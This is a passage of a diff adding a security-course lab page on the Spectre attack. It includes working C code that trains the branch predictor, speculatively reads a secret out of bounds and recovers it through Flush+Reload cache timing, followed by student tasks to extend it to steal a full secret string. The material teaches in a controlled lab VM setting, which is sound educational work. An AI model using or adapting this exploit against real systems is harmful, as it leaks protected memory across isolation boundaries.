+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="n">scores</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+<span class="kt">void</span> <span class="nf">reloadSideChannelImproved</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="k">volatile</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
+  <span class="k">register</span> <span class="kt">uint64_t</span> <span class="n">time1</span><span class="p">,</span> <span class="n">time2</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">junk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">];</span>
+    <span class="n">time1</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">);</span>
+    <span class="n">junk</span> <span class="o">=</span> <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
+    <span class="n">time2</span> <span class="o">=</span> <span class="n">__rdtscp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">junk</span><span class="p">)</span> <span class="o">-</span> <span class="n">time1</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">time2</span> <span class="o">&lt;=</span> <span class="n">CACHE_HIT_THRESHOLD</span><span class="p">)</span>
+      <span class="n">scores</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">++</span><span class="p">;</span> <span class="cm">/* if cache hit, add 1 for this value */</span>
+  <span class="p">}</span> 
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">spectreAttack</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">index_beyond</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="kt">uint8_t</span> <span class="n">s</span><span class="p">;</span>
+  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">z</span><span class="p">;</span>
+
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>  <span class="p">{</span> <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]);</span> <span class="p">}</span>
+
+  <span class="c1">// Train the CPU to take the true branch inside victim().</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">restrictedAccess</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>  
+  <span class="p">}</span>
+
+  <span class="c1">// Flush bound_upper, bound_lower, and array[] from the cache.</span>
+  <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">bound_upper</span><span class="p">);</span>
+  <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">bound_lower</span><span class="p">);</span> 
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>  <span class="p">{</span> <span class="n">_mm_clflush</span><span class="p">(</span><span class="o">&amp;</span><span class="n">array</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]);</span> <span class="p">}</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">z</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">z</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="n">z</span><span class="o">++</span><span class="p">)</span>  <span class="p">{</span>  <span class="p">}</span>
+  <span class="c1">//</span>
+  <span class="c1">// Ask victim() to return the secret in out-of-order execution.</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="n">restrictedAccess</span><span class="p">(</span><span class="n">index_beyond</span><span class="p">);</span>
+  <span class="n">array</span><span class="p">[</span><span class="n">s</span><span class="o">*</span><span class="mi">4096</span> <span class="o">+</span> <span class="n">DELTA</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">88</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="kt">uint8_t</span> <span class="n">s</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">index_beyond</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)(</span><span class="n">secret</span> <span class="o">-</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">);</span>
+
+  <span class="n">flushSideChannel</span><span class="p">();</span>
+  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">scores</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> 
+
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;*****</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>  <span class="c1">// This seemly &quot;useless&quot; line is necessary for the attack to succeed</span>
+    <span class="n">spectreAttack</span><span class="p">(</span><span class="n">index_beyond</span><span class="p">);</span>
+    <span class="n">usleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+    <span class="n">reloadSideChannelImproved</span><span class="p">();</span>
+  <span class="p">}</span>
+
+  <span class="kt">int</span> <span class="n">max</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">scores</span><span class="p">[</span><span class="n">max</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">scores</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="n">max</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Reading secret value at index %ld</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">index_beyond</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The secret value is %d(%c)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">max</span><span class="p">,</span> <span class="n">max</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The number of hits is %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">scores</span><span class="p">[</span><span class="n">max</span><span class="p">]);</span>
+  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+<span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="your-tasks">
+<h3>Your tasks.<a class="headerlink" href="#your-tasks" title="Permalink to this headline">¶</a></h3>
+<p>Please compile and run <code class="docutils literal notranslate"><span class="pre">SpectreAttackImproved.c</span></code>, and do the following
+tasks:</p>
+<ul class="simple">
+<li><p>You may observe that when running the code above, the one with the
+highest score is very likely to be <code class="docutils literal notranslate"><span class="pre">scores[0]</span></code>. Please figure out
+why, and fix the code above, so the actual secret value (which is not
+zero) will be printed out.</p></li>
+<li><p>Line ①  seems useless, but from our experience on SEED Ubuntu 20.04,
+without this line, the attack will not work. On the SEED Ubuntu 16.04
+VM, there is no need for this line. We have not figured out the exact
+reason yet, so if you can, your instructor will likely give you bonus
+points. Please run the program with and without this line, and
+describe your observations.</p></li>
+<li><p>Line ② causes the program to sleep for 10 microseconds. How long the
+program sleeps does affect the success rate of the attack. Please try
+several other values, and describe your observations.</p></li>
+</ul>
+</div>
+</div>
+<div class="section" id="task-6-steal-the-entire-secret-string">
+<h2>Task 6: Steal the Entire Secret String<a class="headerlink" href="#task-6-steal-the-entire-secret-string" title="Permalink to this headline">¶</a></h2>
+<p>In the previous task, we just read the first character of the <code class="docutils literal notranslate"><span class="pre">secret</span></code>
+string. In this task, we need to print out the entire string using the
+Spectre attack. Please write your own code or extend the code in Task 5;
+include your execution results in the report.</p>
+</div>
+<div class="section" id="submission">
+<h2>Submission<a class="headerlink" href="#submission" title="Permalink to this headline">¶</a></h2>
+<p>You need to submit a detailed lab report, with screenshots, to describe
+what you have done and what you have observed. You also need to provide
+explanation to the observations that are interesting or surprising.
+Please also list the important code snippets followed by explanation.
+Simply attaching code without any explanation will not receive credits.</p>
+<div class="section" id="references">
+<h3>References<a class="headerlink" href="#references" title="Permalink to this headline">¶</a></h3>
+<p id="id1">[1]  Paul Kocher, Daniel Genkin, Daniel Gruss, Werner Haas, Mike Hamburg, Moritz Lipp, Stefan Man-gard, Thomas Prescher, Michael Schwarz, and Yuval Yarom.  Spectre attacks:  Exploiting speculativeexecution.ArXiv e-prints, January 2018.</p>
+<p id="id2">[2]  Yuval Yarom and Katrina Falkner.  Flush+reload:  A high resolution, low noise, l3 cache side-channelattack.  InProceedings of the 23rd USENIX Conference on Security Symposium, SEC’14, pages 719–732, Berkeley, CA, USA, 2014. USENIX Association.</p>
+</div>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+        <a href="../mobile/mobile_index.html" class="btn btn-neutral float-right" title="Mobile Security Labs" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+        <a href="meltdown_attack.html" class="btn btn-neutral float-left" title="Meltdown Attack Lab" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &#169; Copyright 2021, NEXUS Lab.
+
+    </p>
+  </div>
+    
+    
+    
+    Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    
+    provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
